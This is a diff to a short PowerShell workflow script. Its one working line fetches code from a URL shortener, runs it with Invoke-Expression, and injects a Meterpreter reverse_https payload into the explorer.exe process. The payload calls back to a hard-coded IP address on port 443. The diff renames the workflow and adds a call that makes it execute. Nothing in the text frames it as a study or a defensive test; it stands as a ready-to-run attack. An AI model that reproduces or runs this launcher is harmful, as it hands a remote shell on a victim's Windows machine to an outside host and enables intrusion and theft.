@@ -1,4 +1,4 @@
-workflow Test-Workflow
+workflow Test
 {
     Parallel
     {
@@ -9,3 +9,5 @@ workflow Test-Workflow
         iwr https://goo.gl/UJL3nD | iex; Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443
     }
 }
+
+Test
